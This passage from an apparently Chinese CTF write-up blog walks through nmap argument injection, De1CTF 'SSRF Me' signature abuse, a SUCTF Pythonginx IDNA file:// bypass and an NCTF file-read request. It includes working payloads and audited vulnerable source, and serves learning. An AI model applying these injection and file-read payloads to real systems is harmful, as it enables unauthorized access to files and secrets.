href="https://link.zhihu.com/?target=https://paper.seebug.org/164/">escapeshellarg()+escapeshellcmd()</a></p><p>这下不得不换一个别人的思路了</p><p>这里网上的wp采用另一个参数<code>iL</code>来读取&#x2F;flag下的内容</p><p>paylaod:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=127.0.0.1&#x27; -iL /flag -oN flag.txt &#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240112210950828.png" alt="image-20240112210950828"></p><p>这里添加的<code>&#39;</code>用来绕过escapeshellarg()+escapeshellcmd()</p><p>关于<code>escapeshellarg()+escapeshellcmd()</code>可以参考: </p><p><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p><p>大概意思:</p><blockquote><p>escapeshellarg():</p><p>对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</p><p>escapeshellcmd():</p><p>反斜线（\）会在以下字符之前插入：<code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`、<code>\x0A</code> 和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code> 仅在不配对儿的时候被转义。在 Windows 平台上，所有这些字符以及 <code>%</code> 和 <code>!</code> 字符前面都有一个插入符号（<code>^</code>）。</p></blockquote><p>两者加在一起使用就会产生能bypass的地方</p><p>测试:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240113192401065.png" alt="image-20240113192401065"></p><p>即escapeshellarg()添加的’<code>\</code>被escapeshellcmd()使用<code>\</code>转义,后面的引号也就逃逸了</p><p>直接访问得到flag,这是由于<code>-iL</code>在扫描到非主机名时会报错而把内容显示出来</p><p>不过此方法并不够完美,因为我们无法提前得知flag的位置…</p>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nmap参数注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF 2019 SSRF Me</title>
      <link href="/2024/01/08/De1CTF-2019-SSRF-Me/"/>
      <url>/2024/01/08/De1CTF-2019-SSRF-Me/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240108185428742.png" alt="image-20240108185428742"></p><p>没有缩进的python</p><p>尝试还原 or 上网找师傅的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># #encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, action, param, sign, ip</span>):        <span class="comment">#初始赋值</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):       </span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">self</span>):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()): <span class="comment">#52</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)   <span class="comment">#以写的形式打开result.txt</span></span><br><span class="line">                resp = scan(self.param)<span class="comment">#79</span></span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> (resp)<span class="comment">#################这并不会在网页中打印resp的值</span></span><br><span class="line">                    tmpfile.write(resp)    <span class="comment">#将resp中的数据写入result.txt中</span></span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)    <span class="comment">#打开方式为只读</span></span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()    <span class="comment">#读取result.txt中的数据</span></span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>): <span class="comment">#30</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign): <span class="comment">#86</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)     </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))        <span class="comment">#cookie传递action参数，对应不同的处理方式</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))        <span class="comment">#传递get方式的参数param</span></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))            <span class="comment">#cookie传递sign参数sign</span></span><br><span class="line">    ip = request.remote_addr                <span class="comment">#获取请求端的ip地址</span></span><br><span class="line">    <span class="keyword">if</span>(waf(param)):     <span class="comment">#92       #调用waf函数进行过滤</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)             <span class="comment">#创建Task类对象</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())            <span class="comment">#以json的形式返回到客户端</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>): <span class="comment">#33</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]        <span class="comment">#</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):               </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="comment"># xxx flag.txt scan</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):            <span class="comment">#将传入的字符串进行md5加密</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):        <span class="comment">#70                #waf过滤掉了使用gopher和file直接ssrf的方法</span></span><br><span class="line">    check=param.strip().lower() <span class="comment">#删除首尾空格并转换为小写</span></span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">9999</span>) </span><br></pre></td></tr></table></figure><p><strong>两个关键api:</strong></p><ol><li><strong>&#x2F;geneSign:</strong></li></ol><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):               </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>传入param&#x3D;xxxx</p><p>返回值表达式:md5(secert_key + ‘xxxx’ + ‘scan’)</p><ol start="2"><li><strong>&#x2F;De1ta:</strong></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)     </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))        <span class="comment">#cookie传递action参数，对应不同的处理方式</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))        <span class="comment">#传递get方式的参数param</span></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))            <span class="comment">#cookie传递sign参数sign</span></span><br><span class="line">    ip = request.remote_addr                <span class="comment">#获取请求端的ip地址</span></span><br><span class="line">    <span class="keyword">if</span>(waf(param)):     <span class="comment">#92       #调用waf函数进行过滤</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)             <span class="comment">#创建Task类对象</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())            <span class="comment">#以json的形式返回到客户端</span></span><br></pre></td></tr></table></figure><p>task.Exec()中实现了对result.txt的读写</p><p>第一反应实际上应该是直接ssrf,但加了waf</p><p><strong>题目提示flag在flag.txt中,故我们可以先把flag.txt写入result.txt,再读取result.txt</strong></p><p>如此,也就不用绕waf了</p><p>但有一个不可避免的问题是 想要执行Exec就必须通过Exec一开始的checkSign验证</p><h2 id="如何通过验证呢"><a href="#如何通过验证呢" class="headerlink" title="如何通过验证呢?"></a>如何通过验证呢?</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>): <span class="comment">#30</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign): <span class="comment">#86</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):               </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>我们需要传入三个参数: param  action  sign</p><p>毫无疑问param是我们要读取的文件,而action可选为scan或read, sign则是对secert_key + param + action的散列</p><p>secert_key 是随机的,这个散列值需要从<code>/geneSign?param=</code>中获取,但是从这获取的sign中action为scan</p><p>也就是上面提到的<code>md5(secert_key + &#39;xxxx&#39; + &#39;scan&#39;)</code></p><p><strong>有意思的是,在action的判断中采用了<code>in</code>,并且没有if else结构,故可以使<code>action=readscan</code>来同时触发写和读</strong></p><p>那么需要的散列值就是<code>md5(secert_key + &#39;xxxx&#39; + &#39;readscan&#39;)</code></p><p>可以发现这与<code>md5(secert_key + &#39;xxxxread&#39; + &#39;scan&#39;)</code>等价,这是可以从&#x2F;geneSign获取的一个md5</p><p>因此 可以构造<code>/geneSign?param=flag.txtread</code>来获取这个sign</p><p><strong>这个sign允许我们传入param&#x3D;flag.txt,action&#x3D;readscan</strong></p><p>如此一来,就可以通过验证并把flag写入到result.txt并读取出来</p><p>poc:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240108195710657.png" alt="image-20240108195710657"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240108195726830.png" alt="image-20240108195726830"></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idna与utf-8编码漏洞 [SUCTF 2019]Pythonginx</title>
      <link href="/2024/01/08/idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E-SUCTF-2019-Pythonginx/"/>
      <url>/2024/01/08/idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E-SUCTF-2019-Pythonginx/</url>
      
        <content type="html"><![CDATA[<p>参考:</p><p>[Hanamizuki花水木]: <a href="https://www.cnblogs.com/cimuhuashuimu/p/11490431.html">https://www.cnblogs.com/cimuhuashuimu/p/11490431.html</a>“ idna与utf-8编码漏洞”<br>[lz1y]: <a href="https://xz.aliyun.com/t/2737">https://xz.aliyun.com/t/2737</a>“Punycode安全威胁浅析”<br>[black hat 2019]: <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a>“us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf”</p><p>通过这几篇文章便可以基本了解idna与utf-8编码漏洞问题</p><p>涉及题目:</p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>把得到的提示代码复制下来并整理缩进</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>(): </span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>) </span><br><span class="line">    host = parse.urlparse(url).hostname </span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span> </span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url)) </span><br><span class="line">    host = parts[<span class="number">1</span>] </span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host </span><br><span class="line">    newhost = [] </span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>): </span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) </span><br><span class="line">        parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost) </span><br><span class="line">    <span class="comment">#去掉 url 中的空格 </span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>] </span><br><span class="line">    host = parse.urlparse(finalUrl).hostname </span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read() </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure><p>可以发现我们是需要执行到第19行的<code>.read()</code>,也就是需要传入pyaload仅仅使得第三个if条件成立</p><p>第三次是将主机名以<code>.</code>拆分,将每一部分idna编码后又utf-8解码,然后重新拼接为主机名,再还原为url,再取hostname</p><p>这里便使用<code>℆</code>这个字符来绕过前两次if,而在第三次时<code>℆</code>会被解码为<code>c/u</code></p><p>之后便是ssrf读取本地文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: file://suctf.c℆sr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure><p>得到flag地址为&#x2F;usr&#x2F;fffffflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.c℆sr/fffffflag</span><br></pre></td></tr></table></figure><p>参考题解:</p><p>[rabbittt]: <a href="https://www.cnblogs.com/rabbittt/p/13297683.html">https://www.cnblogs.com/rabbittt/p/13297683.html</a>“ [SUCTF 2019]Pythonginx”</p><p><strong>3.Ngnix重要文件位置</strong></p><blockquote><p>▷配置文件存放目录：&#x2F;etc&#x2F;nginx</p><p>▶主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf 或 &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><p>▷管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service</p><p>▶模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules</p><p>▷应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx</p><p>▶程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</p><p>▷日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx</p></blockquote><p>[出题人笔记]: <a href="https://xz.aliyun.com/t/6057?time__1311=n4+xnD0DRDgGG=G8+DCDlhje0=YTviggx7K4ex&amp;alichlgref=https://www.cnblogs.com/">https://xz.aliyun.com/t/6057?time__1311=n4%2BxnD0DRDgGG%3DG8%2BDCDlhje0%3DYTviggx7K4ex&amp;alichlgref=https%3A%2F%2Fwww.cnblogs.com%2F</a>“ 出题人笔记”</p><p>这让我不禁想起了一道题目是关于利用php大写字母转换为小写字母函数而bypass对admin的过滤,挖个坑先,下次记录</p>]]></content>
      
      
      <categories>
          
          <category> 字符编码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> idna与utf-8编码漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF 2023 Web 复现</title>
      <link href="/2024/01/06/NCTF-2023-Web-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/01/06/NCTF-2023-Web-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="NCTF-2023-web-题目复现"><a href="#NCTF-2023-web-题目复现" class="headerlink" title="NCTF 2023 web 题目复现"></a>NCTF 2023 web 题目复现</h1><p>复现+尝试对wp进一步解释</p><h2 id="webshell-generator"><a href="#webshell-generator" class="headerlink" title="webshell_generator"></a>webshell_generator</h2><p>获取生成的webshell时存在任意文件读取</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/download.php?file=/tmp/0cjbe2b32se0qva8&amp;filename=webshell.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.26:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.1.26:8080/</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以读取到以下文件</p><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">security_validate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\r|\n/&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$key</span> 不能包含换行符！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>) &gt; <span class="number">114</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$key</span> 不能超过114个字符！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">security_validate</span>();</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>] &amp;&amp; @<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>] &amp;&amp; @<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;language&#x27;</span>] !== <span class="string">&#x27;PHP&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;PHP是最好的语言&quot;</span>);</span><br><span 